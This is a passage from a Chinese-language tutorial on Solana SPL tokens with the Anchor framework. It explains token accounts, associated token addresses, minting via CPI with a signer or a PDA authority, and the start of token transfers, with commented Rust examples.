Mint&gt;,</span><br></pre></td></tr></table></figure><h2 id="创建Token账户"><a href="#创建Token账户" class="headerlink" title="创建Token账户"></a>创建Token账户</h2><p>在 Solana 的 SPL Token标准中，每种代币（对应一个 Mint 账户）都有很多 Token账户，每个 Token账户属于一个特定的用户钱包地址，专门用来保存该用户持有的该种代币的数量。它的结构如下：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">/// 账户数据结构。</span></span><br><span class="line"><span class="meta">#[repr(C)]</span>  <span class="comment">// 使用 C 语言的内存布局，确保在链上序列化一致性</span></span><br><span class="line"><span class="meta">#[derive(Clone, Copy, Debug, Default, PartialEq)]</span>  <span class="comment">// 派生常见 trait，支持拷贝、调试、默认值等</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Account</span> &#123;</span><br><span class="line">    <span class="comment">/// 与此账户关联的 Mint（表示这是哪一种代币）</span></span><br><span class="line">    <span class="keyword">pub</span> mint: Pubkey,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 此账户的所有者（钱包地址）</span></span><br><span class="line">    <span class="keyword">pub</span> owner: Pubkey,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 此账户中持有的代币数量</span></span><br><span class="line">    <span class="keyword">pub</span> amount: <span class="type">u64</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 如果 `delegate` 为 `Some`，则 `delegated_amount` 表示代理地址可使用的代币数量</span></span><br><span class="line">    <span class="keyword">pub</span> delegate: COption&lt;Pubkey&gt;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 此账户的状态（如：初始化、冻结）</span></span><br><span class="line">    <span class="keyword">pub</span> state: AccountState,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 如果 `is_native.is_some`，说明是一个原生SOL包装账户，该值为其保持租金豁免所需的最低余额</span></span><br><span class="line">    <span class="comment">/// 一个账户必须保持租金豁免，因此该值用于防止封装SOL（wSOL）账户余额低于该阈值</span></span><br><span class="line">    <span class="keyword">pub</span> is_native: COption&lt;<span class="type">u64</span>&gt;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 授权代理地址可以使用的代币数量（只有当 `delegate` 存在时才生效）</span></span><br><span class="line">    <span class="keyword">pub</span> delegated_amount: <span class="type">u64</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 可以关闭此账户的可选地址（授权关闭者）</span></span><br><span class="line">    <span class="keyword">pub</span> close_authority: COption&lt;Pubkey&gt;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">///注意Pubkey 是 Solana 中的公钥（32字节地址）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外，Token账户有个特定结构的Token账户——关联账户（ATA），就是某个用户的钱包地址（owner）+ 某个代币（mint）唯一对应的标准 Token 账户地址，它的用途是用于标准化存储某个钱包所持有的某种 SPL 代币的余额。</p><blockquote><p>例如：钱包 A 拥有 100 个 USDC（mint &#x3D; USDC 的地址） → 会有一个 ATA 专门存储这个 USDC 的余额<br>使用find_program_address(seed,bump)生成关联地址：</p></blockquote><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">get_associated_token_address_and_bump_seed_internal</span>(</span><br><span class="line">    wallet_address: &amp;Pubkey,     <span class="comment">// 拥有者的钱包地址</span></span><br><span class="line">    token_mint_address: &amp;Pubkey, <span class="comment">// 代币的 mint 地址</span></span><br><span class="line">    program_id: &amp;Pubkey,         <span class="comment">// 关联 Token 程序的 ID</span></span><br><span class="line">    token_program_id: &amp;Pubkey,   <span class="comment">// Token 程序的 ID</span></span><br><span class="line">) <span class="punctuation">-&gt;</span> (Pubkey, <span class="type">u8</span>) &#123;             <span class="comment">// 返回值为关联账户的地址和 bump seed</span></span><br><span class="line">    <span class="comment">// 使用 find_program_address 生成 PDA</span></span><br><span class="line">    Pubkey::<span class="title function_ invoke__">find_program_address</span>(</span><br><span class="line">        &amp;[ </span><br><span class="line">            &amp;wallet_address.<span class="title function_ invoke__">to_bytes</span>(),        <span class="comment">// 所有者公钥的字节数组</span></span><br><span class="line">            &amp;token_program_id.<span class="title function_ invoke__">to_bytes</span>(),      <span class="comment">// Token 程序的公钥字节数组</span></span><br><span class="line">            &amp;token_mint_address.<span class="title function_ invoke__">to_bytes</span>(),    <span class="comment">// 代币 mint 地址的字节数组</span></span><br><span class="line">        ],</span><br><span class="line">        program_id, <span class="comment">// 与关联账户相关联的程序 ID（例如 Token Program ID）</span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据用户具体的使用，有俩种方式创建Token账户</p><ul><li><p>当使用关联Token账户（ATA）时，使用associated_token约束.比如用户钱包</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> anchor_spl::associated_token::AssociatedToken;  <span class="comment">// 导入 Anchor SPL 库中的关联 Token 程序相关功能</span></span><br><span class="line"><span class="keyword">use</span> anchor_spl::token_interface::&#123;Mint, TokenAccount, TokenInterface&#125;; <span class="comment">// 导入与 Token 程序相关的接口，Mint 是代币的铸造地址，TokenAccount 是代币账户，TokenInterface 是 Token 程序接口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --snip--（省略的部分，通常是函数或程序主体）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Accounts)]</span>  <span class="comment">// 声明 Anchor 账户结构体，标记为 Accounts，用于描述与程序交互时需要的账户。</span></span><br><span class="line">  <span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">CreateTokenAccount</span>&lt;<span class="symbol">&#x27;info</span>&gt; &#123;</span><br><span class="line">  <span class="meta">#[account(mut)]</span>  <span class="comment">// 表示这个账户是可变的，将会在后续的操作中修改</span></span><br><span class="line">  <span class="keyword">pub</span> signer: Signer&lt;<span class="symbol">&#x27;info</span>&gt;,  <span class="comment">// signer 账户，表示谁发起这个操作，通常是一个钱包地址，用于支付创建账户的费用，并提供签名。</span></span><br><span class="line">  </span><br><span class="line">  <span class="meta">#[account(  // 账户宏，定义如何初始化 token_account，以下是初始化的相关参数</span></span><br><span class="line"><span class="meta">      init_if_needed,  // 如果账户不存在则初始化它，如果已存在则不做任何处理</span></span><br><span class="line"><span class="meta">      payer = signer,  // 创建该账户所需的费用将由 signer 账户支付</span></span><br><span class="line"><span class="meta">      associated_token::mint = mint,  // 关联 Token 账户将对应的 mint 地址为指定的 mint 地址，表示 token 的种类</span></span><br><span class="line"><span class="meta">      associated_token::authority = signer,  // 关联的 Token 账户的权限由 signer 控制，即 signer 可以操作该账户</span></span><br><span class="line"><span class="meta">      associated_token::token_program = token_program,  // 关联 Token 程序，通常是 Solana 官方的 Token 程序</span></span><br><span class="line"><span class="meta">  )]</span></span><br><span class="line">  <span class="keyword">pub</span> token_account: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, TokenAccount&gt;,  <span class="comment">// 目标账户，即创建的 Token 账户，通过 InterfaceAccount 将账户与 TokenAccount 关联</span></span><br><span class="line">  <span class="keyword">pub</span> mint: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, Mint&gt;,  <span class="comment">// 代币的 mint 地址，表示 Token 的类型，用于标识该 Token 账户属于哪个代币种类</span></span><br><span class="line">  <span class="keyword">pub</span> token_program: Interface&lt;<span class="symbol">&#x27;info</span>, TokenInterface&gt;,  <span class="comment">// 指定与 Token 相关的程序，通常是 Solana 官方的 Token 程序，用于处理代币操作（如转账、查询等）</span></span><br><span class="line">  <span class="keyword">pub</span> associated_token_program: Program&lt;<span class="symbol">&#x27;info</span>, AssociatedToken&gt;,  <span class="comment">// 指定使用的关联 Token 程序，它负责管理与钱包地址关联的 Token 账户</span></span><br><span class="line">  <span class="keyword">pub</span> system_program: Program&lt;<span class="symbol">&#x27;info</span>, System&gt;,  <span class="comment">// Solana 的系统程序，用于账户和资源管理（例如账户创建）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>当使用非特定ATA的Token账户（如自定义PDA或使用密钥对公钥作为地址的Token账户）时，使用token约束，比如程序控制的账户</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">use</span> anchor_spl::token_interface::&#123;Mint, TokenAccount, TokenInterface&#125;; <span class="comment">// 导入 Anchor SPL 库中的 Token 相关接口，Mint 是代币的铸造地址，TokenAccount 是代币账户，TokenInterface 是 Token 程序接口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --snip--（省略的部分，通常是函数或程序主体）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Accounts)]</span> <span class="comment">// 声明 Anchor 账户结构体，标记为 Accounts，用于描述与程序交互时需要的账户。</span></span><br><span class="line"> <span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">CreateTokenAccount</span>&lt;<span class="symbol">&#x27;info</span>&gt; &#123;</span><br><span class="line">  <span class="meta">#[account(mut)]</span>  <span class="comment">// 表示这个账户是可变的，后续操作会修改它</span></span><br><span class="line">  <span class="keyword">pub</span> signer: Signer&lt;<span class="symbol">&#x27;info</span>&gt;,  <span class="comment">// signer 账户，表示操作发起者，通常是一个钱包地址，提供签名并支付交易费用</span></span><br><span class="line"></span><br><span class="line">  <span class="meta">#[account(  // 账户宏，定义如何初始化 token_account，以下是初始化的相关参数</span></span><br><span class="line"><span class="meta">      init_if_needed,  // 如果账户不存在，则初始化该账户；如果已存在，则跳过初始化</span></span><br><span class="line"><span class="meta">      payer = signer,  // 创建该账户所需的 SOL 租金由 signer 账户支付</span></span><br><span class="line"><span class="meta">      token::mint = mint,  // 关联的 mint 地址，表示该 Token 账户的代币类型</span></span><br><span class="line"><span class="meta">      token::authority = token_account,  // 该 Token 账户的授权者设置为 token_account，通常是签名者</span></span><br><span class="line"><span class="meta">      token::token_program = token_program,  // 关联的 Token 程序，通常是 Solana 官方的 Token 程序</span></span><br><span class="line"><span class="meta">      seeds = [b<span class="string">&quot;token&quot;</span>]</span>,  <span class="comment">// 使用种子值 `token` 来派生一个程序派生地址（PDA）</span></span><br><span class="line">      bump  <span class="comment">// `bump` 是在计算派生地址时用于确保唯一性和合法性的附加参数</span></span><br><span class="line">  )]</span><br><span class="line">  <span class="keyword">pub</span> token_account: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, TokenAccount&gt;,  <span class="comment">// 创建的目标 Token 账户，表示该账户与 mint 地址关联</span></span><br><span class="line">  <span class="keyword">pub</span> mint: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, Mint&gt;,  <span class="comment">// 代币的 mint 地址，表示该 Token 账户所属的代币种类</span></span><br><span class="line">  <span class="keyword">pub</span> token_program: Interface&lt;<span class="symbol">&#x27;info</span>, TokenInterface&gt;,  <span class="comment">// 关联的 Token 程序，用于处理所有与 Token 相关的操作</span></span><br><span class="line">  <span class="keyword">pub</span> system_program: Program&lt;<span class="symbol">&#x27;info</span>, System&gt;,  <span class="comment">// Solana 系统程序，用于创建账户等基础操作</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="铸造代币"><a href="#铸造代币" class="headerlink" title="铸造代币"></a>铸造代币</h2><p>铸造代币是指通过调用 Token Program 上的 mint_to 指令创建新代币单位的过程。只有被指定为铸币账户上的铸币权限的地址才能铸造新代币。该指令还要求在代币接收地址上存在一个目标代币账户。<br>要通过 Anchor 程序铸造代币，你需要向 Token Program 或 Token Extension Program 的 指令发起跨程序调用（CPI）。<br>这意味着你要从程序中的指令调用 Token Program 或 Token Extension Program 上的 指令。你的程序作为中介，向代币程序传递所需的账户、指令数据和签名。</p><h3 id="通过CPI铸造程序"><a href="#通过CPI铸造程序" class="headerlink" title="通过CPI铸造程序"></a>通过CPI铸造程序</h3><p><strong>MintTo结构体：</strong></p><ul><li>mint- 用于创建新代币单位的铸币账户</li><li>to- 用于接收新铸造代币的目标代币账户</li><li>authority- 拥有铸造代币权限的铸币授权</li></ul><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> anchor_lang::prelude::*; <span class="comment">// 引入 Anchor 框架的基础设施</span></span><br><span class="line"><span class="keyword">use</span> anchor_spl::token_interface::&#123;<span class="keyword">self</span>, Mint, MintTo, TokenAccount, TokenInterface&#125;; <span class="comment">// 引入 SPL Token 程序的接口</span></span><br><span class="line"></span><br><span class="line">declare_id!(<span class="string">&quot;3pX5NKLru1UBDVckynWQxsgnJeUN3N1viy36Gk9TSn8d&quot;</span>); <span class="comment">// 声明当前程序的 ID，程序唯一标识符</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#[program]</span>  <span class="comment">// 程序宏，标记当前模块为 Anchor 程序</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">mod</span> token_example &#123; </span><br><span class="line">    <span class="keyword">use</span> super::*; <span class="comment">// 导入上面定义的内容</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// mint_tokens 函数，用于铸造指定数量的代币到指定 Token 账户</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">mint_tokens</span>(ctx: Context&lt;MintTokens&gt;, amount: <span class="type">u64</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;()&gt; &#123; </span><br><span class="line">        <span class="comment">// 构建 CPI 账户信息结构体</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">cpi_accounts</span> = MintTo &#123;</span><br><span class="line">            mint: ctx.accounts.mint.<span class="title function_ invoke__">to_account_info</span>(),  <span class="comment">// 代币 mint 地址</span></span><br><span class="line">            to: ctx.accounts.token_account.<span class="title function_ invoke__">to_account_info</span>(), <span class="comment">// 目标 Token 账户</span></span><br><span class="line">            authority: ctx.accounts.signer.<span class="title function_ invoke__">to_account_info</span>(), <span class="comment">// 执行铸币操作的授权者</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">cpi_program</span> = ctx.accounts.token_program.<span class="title function_ invoke__">to_account_info</span>(); <span class="comment">// 获取关联的 Token 程序账户信息</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">cpi_context</span> = CpiContext::<span class="title function_ invoke__">new</span>(cpi_program, cpi_accounts); <span class="comment">// 创建 CPI 上下文，包含程序和账户信息</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用 mint_to 函数进行铸币操作</span></span><br><span class="line">        token_interface::<span class="title function_ invoke__">mint_to</span>(cpi_context, amount)?;  <span class="comment">// 使用指定的数量铸造代币</span></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(())  <span class="comment">// 返回 Ok，表示操作成功</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 账户结构体，用于定义 mint_tokens 函数的账户参数</span></span><br><span class="line"><span class="meta">#[derive(Accounts)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">MintTokens</span>&lt;<span class="symbol">&#x27;info</span>&gt; &#123;</span><br><span class="line">    <span class="meta">#[account(mut)]</span> <span class="comment">// signer 是可变的账户，可能会进行操作</span></span><br><span class="line">    <span class="keyword">pub</span> signer: Signer&lt;<span class="symbol">&#x27;info</span>&gt;,  <span class="comment">// 发起铸币操作的账户（签名者）</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#[account(mut)]</span> <span class="comment">// mint 是可变的账户，代表代币种类</span></span><br><span class="line">    <span class="keyword">pub</span> mint: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, Mint&gt;,  <span class="comment">// 代币 mint 地址</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#[account(mut)]</span> <span class="comment">// token_account 是可变的账户，表示目标 Token 账户</span></span><br><span class="line">    <span class="keyword">pub</span> token_account: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, TokenAccount&gt;,  <span class="comment">// 目标 Token 账户</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pub</span> token_program: Interface&lt;<span class="symbol">&#x27;info</span>, TokenInterface&gt;,  <span class="comment">// 关联的 Token 程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解释CPI相关的部分：</strong></p><ul><li>let cpi_accounts &#x3D; MintTo { … };：构建一个 MintTo 结构体，表示代币铸造操作的账户信息.</li><li>let cpi_program &#x3D; ctx.accounts.token_program.to_account_info();：获取 Token 程序的账户信息，这是代币相关操作的程序。</li><li>let cpi_context &#x3D; CpiContext::new(cpi_program, cpi_accounts);：将 cpi_program 和 cpi_accounts 组合成一个 CPI 上下文，这将用来调用代币程序的 mint_to 函数。</li><li>token_interface::mint_to(cpi_context, amount)?;：调用 SPL Token 程序的 mint_to 函数来实际铸造代币，传入 CPI 上下文和指定的数量 amount。</li></ul><h2 id="通过CPI使用PDA铸币授权铸造代币"><a href="#通过CPI使用PDA铸币授权铸造代币" class="headerlink" title="通过CPI使用PDA铸币授权铸造代币"></a>通过CPI使用PDA铸币授权铸造代币</h2><p>使用 PDA 来授权铸币的目的是确保某些操作只能由程序控制，并且可以通过程序进行管理，而不是依赖于某个签名者的私钥。具体操作时，我们通常会使用特定的种子来派生 PDA，并将它设置为 mint::authority，这样就能通过这个 PDA 来授权铸币操作。</p><p>结合之前所讲的 Token Mint部分，就好理解了。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> anchor_lang::prelude::*;  <span class="comment">// 引入 Anchor 框架的标准库，提供基础功能</span></span><br><span class="line"><span class="keyword">use</span> anchor_spl::&#123;  <span class="comment">// 引入 anchor_spl 库，用于处理代币相关的操作</span></span><br><span class="line">    associated_token::AssociatedToken,  <span class="comment">// 用于与关联账户相关的功能</span></span><br><span class="line">    token_interface::&#123;<span class="keyword">self</span>, Mint, MintTo, TokenAccount, TokenInterface&#125;,  <span class="comment">// 处理代币的铸造、转账等</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">declare_id!(<span class="string">&quot;3pX5NKLru1UBDVckynWQxsgnJeUN3N1viy36Gk9TSn8d&quot;</span>);  <span class="comment">// 定义程序的 ID，必须与部署合约时的 ID 匹配</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#[program]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">mod</span> token_example &#123;  <span class="comment">// 定义一个名为 token_example 的程序模块</span></span><br><span class="line">    <span class="keyword">use</span> super::*;  <span class="comment">// 引入外部作用域中的所有内容</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建 mint 账户的函数</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">create_mint</span>(ctx: Context&lt;CreateMint&gt;) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;()&gt; &#123;  </span><br><span class="line">        msg!(<span class="string">&quot;Created Mint Account: &#123;:?&#125;&quot;</span>, ctx.accounts.mint.<span class="title function_ invoke__">key</span>());  <span class="comment">// 输出 mint 账户的公钥</span></span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(())  <span class="comment">// 返回成功</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 铸造代币的函数</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">mint_tokens</span>(ctx: Context&lt;MintTokens&gt;, amount: <span class="type">u64</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;()&gt; &#123;  </span><br><span class="line">        <span class="comment">// 定义签名者种子（使用 &quot;mint&quot; 作为种子，添加 bump 值）</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">signer_seeds</span>: &amp;[&amp;[&amp;[<span class="type">u8</span>]]] = &amp;[&amp;[<span class="string">b&quot;mint&quot;</span>, &amp;[ctx.bumps.mint]]];  </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义 CPI 账户信息，用于铸造代币</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">cpi_accounts</span> = MintTo &#123;</span><br><span class="line">            mint: ctx.accounts.mint.<span class="title function_ invoke__">to_account_info</span>(),  <span class="comment">// mint 账户的公钥</span></span><br><span class="line">            to: ctx.accounts.token_account.<span class="title function_ invoke__">to_account_info</span>(),  <span class="comment">// 收款的 token 账户公钥</span></span><br><span class="line">            authority: ctx.accounts.mint.<span class="title function_ invoke__">to_account_info</span>(),  <span class="comment">// 铸造权限（mint 本身作为 authority）</span></span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">let</span> <span class="variable">cpi_program</span> = ctx.accounts.token_program.<span class="title function_ invoke__">to_account_info</span>();  <span class="comment">// 引用 Token 程序</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">cpi_context</span> = CpiContext::<span class="title function_ invoke__">new</span>(cpi_program, cpi_accounts).<span class="title function_ invoke__">with_signer</span>(signer_seeds);  <span class="comment">// 创建 CPI 上下文，附带签名者的种子</span></span><br><span class="line"></span><br><span class="line">        token_interface::<span class="title function_ invoke__">mint_to</span>(cpi_context, amount)?;  <span class="comment">// 调用 mint_to 函数铸造代币</span></span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(())  <span class="comment">// 返回成功</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义创建 mint 账户时的参数</span></span><br><span class="line"><span class="meta">#[derive(Accounts)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">CreateMint</span>&lt;<span class="symbol">&#x27;info</span>&gt; &#123;</span><br><span class="line">    <span class="meta">#[account(mut)]</span>  <span class="comment">// 表示 signer 账户是可变的，可以进行操作</span></span><br><span class="line">    <span class="keyword">pub</span> signer: Signer&lt;<span class="symbol">&#x27;info</span>&gt;,  <span class="comment">// 用于支付费用的账户（签名者）</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">#[account(  // 定义 mint 账户的初始化配置</span></span><br><span class="line"><span class="meta">        init,  // 初始化 mint 账户</span></span><br><span class="line"><span class="meta">        payer = signer,  // 由 signer 支付费用</span></span><br><span class="line"><span class="meta">        mint::decimals = 6,  // 设置代币的小数位数为 6</span></span><br><span class="line"><span class="meta">        mint::authority = mint,  // mint 账户的 authority 设置为 mint 本身</span></span><br><span class="line"><span class="meta">        mint::freeze_authority = mint,  // mint 账户的 freeze authority 设置为 mint 本身</span></span><br><span class="line"><span class="meta">        seeds = [b<span class="string">&quot;mint&quot;</span>]</span>,  <span class="comment">// 使用 &quot;mint&quot; 字符串作为种子生成 PDA</span></span><br><span class="line">        bump  <span class="comment">// 使用 bump 值来确保 PDA 的合法性</span></span><br><span class="line">    )]</span><br><span class="line">    <span class="keyword">pub</span> mint: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, Mint&gt;,  <span class="comment">// mint 账户，实际存储代币的信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pub</span> token_program: Interface&lt;<span class="symbol">&#x27;info</span>, TokenInterface&gt;,  <span class="comment">// Token 程序接口</span></span><br><span class="line">    <span class="keyword">pub</span> system_program: Program&lt;<span class="symbol">&#x27;info</span>, System&gt;,  <span class="comment">// 系统程序接口</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义铸币操作的参数</span></span><br><span class="line"><span class="meta">#[derive(Accounts)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">MintTokens</span>&lt;<span class="symbol">&#x27;info</span>&gt; &#123;</span><br><span class="line">    <span class="meta">#[account(mut)]</span>  <span class="comment">// 表示 signer 账户是可变的</span></span><br><span class="line">    <span class="keyword">pub</span> signer: Signer&lt;<span class="symbol">&#x27;info</span>&gt;,  <span class="comment">// 用于支付费用的账户（签名者）</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#[account(  // 定义 token_account 的初始化配置</span></span><br><span class="line"><span class="meta">        init_if_needed,  // 如果 token_account 尚不存在，则进行初始化</span></span><br><span class="line"><span class="meta">        payer = signer,  // 由 signer 支付费用</span></span><br><span class="line"><span class="meta">        associated_token::mint = mint,  // 关联的 mint 账户</span></span><br><span class="line"><span class="meta">        associated_token::authority = signer,  // 关联账户的 authority 为 signer</span></span><br><span class="line"><span class="meta">        associated_token::token_program = token_program,  // 关联的 token 程序</span></span><br><span class="line"><span class="meta">    )]</span></span><br><span class="line">    <span class="keyword">pub</span> token_account: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, TokenAccount&gt;,  <span class="comment">// 代币账户，存储持有的代币</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#[account(  // 定义 mint 账户的配置</span></span><br><span class="line"><span class="meta">        mut,  // mint 账户是可变的</span></span><br><span class="line"><span class="meta">        seeds = [b<span class="string">&quot;mint&quot;</span>]</span>,  <span class="comment">// 使用 &quot;mint&quot; 字符串作为种子生成 PDA</span></span><br><span class="line">        bump  <span class="comment">// 使用 bump 值来确保 PDA 的合法性</span></span><br><span class="line">    )]</span><br><span class="line">    <span class="keyword">pub</span> mint: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, Mint&gt;,  <span class="comment">// mint 账户，用于铸造代币</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pub</span> token_program: Interface&lt;<span class="symbol">&#x27;info</span>, TokenInterface&gt;,  <span class="comment">// Token 程序接口</span></span><br><span class="line">    <span class="keyword">pub</span> associated_token_program: Program&lt;<span class="symbol">&#x27;info</span>, AssociatedToken&gt;,  <span class="comment">// 关联账户程序接口</span></span><br><span class="line">    <span class="keyword">pub</span> system_program: Program&lt;<span class="symbol">&#x27;info</span>, System&gt;,  <span class="comment">// 系统程序接口</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="转移代币"><a href="#转移代币" class="headerlink" title="转移代币"></a>转移代币</h2><p>转移代币涉及将代币从一个代币账户移动到另一个共享相同铸造的代币账户。这是通过在代币程序上调用 transfer_checked 指令来完成的。只有指定为源代币账户所有者（权限）的地址可以从该账户中转移代币。</p><h2 id="通过CPI转移代币"><a href="#通过CPI转移代币" class="headerlink" title="通过CPI转移代币"></a>通过CPI转移代币</h2><p>使用<code>token_interface::transfer_checked</code>函数对代币程序或代币扩展程序进行 CPI。此函数需要：</p><ul><li>TransferChecked结构体，该结构体指定所需的账户：<ul><li>mint- 指定要转移的代币类型的铸造账户</li><li>from- 要转移代币的源代币账户</li><li>to- 接收转移代币的目标代币账户</li><li>authority- 源代币账户的所有者</li></ul></li><li>要转移的代币 ，以代币的基本单位调整小数。(例如，如果铸造有 2 位小数，则 100 的数量 &#x3D; 1 个代币)amount</li></ul><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> anchor_lang::prelude::*; <span class="comment">// 导入 Anchor 的预定义模块</span></span><br><span class="line"><span class="keyword">use</span> anchor_spl::token_interface::&#123;<span class="keyword">self</span>, TokenAccount, TokenInterface, TransferChecked&#125;; <span class="comment">// 导入 Anchor SPL Token 相关模块</span></span><br><span class="line"></span><br><span class="line">declare_id!(<span class="string">&quot;3pX5NKLru1UBDVckynWQxsgnJeUN3N1viy36Gk9TSn8d&quot;</span>); <span class="comment">// 声明程序的唯一标识符（ID）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#[program]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">mod</span> token_example &#123;</span><br><span class="line">    <span class="keyword">use</span> super::*;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转账代币的函数，`amount` 参数是转账的代币数量</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">transfer_tokens</span>(ctx: Context&lt;TransferTokens&gt;, amount: <span class="type">u64</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">        <span class="comment">// 获取 mint 账户的 decimals 属性，用于正确处理小数位数</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">decimals</span> = ctx.accounts.mint.decimals;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义 CPI 调用所需的账户信息</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">cpi_accounts</span> = TransferChecked &#123;</span><br><span class="line">            mint: ctx.accounts.mint.<span class="title function_ invoke__">to_account_info</span>(), <span class="comment">// 代币的 Mint 账户（发行者）</span></span><br><span class="line">            from: ctx.accounts.sender_token_account.<span class="title function_ invoke__">to_account_info</span>(), <span class="comment">// 发送方的代币账户</span></span><br><span class="line">            to: ctx.accounts.recipient_token_account.<span class="title function_ invoke__">to_account_info</span>(), <span class="comment">// 接收方的代币账户</span></span><br><span class="line">            authority: ctx.accounts.signer.<span class="title function_ invoke__">to_account_info</span>(), <span class="comment">// 转账操作的授权者（签名者）</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取要调用的程序，这里是 Solana 的 Token Program</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">cpi_program</span> = ctx.accounts.token_program.<span class="title function_ invoke__">to_account_info</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构建 CPI 上下文，将账户信息与目标程序关联</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">cpi_context</span> = CpiContext::<span class="title function_ invoke__">new</span>(cpi_program, cpi_accounts);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行 CPI 调用，完成代币的转账操作</span></span><br><span class="line">        token_interface::<span class="title function_ invoke__">transfer_checked</span>(cpi_context, amount, decimals)?; <span class="comment">// `amount` 是转账数量，`decimals` 是小数位数</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 